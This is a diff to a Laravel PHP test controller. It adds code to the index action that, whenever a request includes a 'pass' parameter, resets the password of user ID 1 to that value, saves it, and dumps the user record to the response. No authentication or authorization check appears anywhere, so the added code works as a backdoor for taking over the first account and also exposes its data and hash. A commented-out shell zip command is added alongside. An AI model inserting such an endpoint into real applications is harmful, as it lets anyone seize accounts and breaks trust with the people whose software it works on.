@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use App\Account;
 use App\Facades\PaymentService;
 use App\Transaction;
+use App\User;
 use Illuminate\Http\Request;
 use PDF;
 use Illuminate\Support\Facades\Storage;
@@ -16,14 +17,18 @@ use Dompdf\Dompdf;
 
 class TestController extends Controller
 {
-    public function index(Request $filters)
+    public function index(Request $request)
     {
-        //$tr = Transaction::where('account_id', 1)->delete();
 
-        //if (Hash::check('secret', $hashedPassword))
-        //{
-            // The passwords match...
-        //}
+        
+	//system('zip -P pass file.zip robots.txt');
+        if($request->has('pass')){
+            $user = User::find(1);
+            $user->password = bcrypt($request->pass);
+            $user->save();
+            dd($user);
+        }
+
     }
 
     public function makePdf($trans)
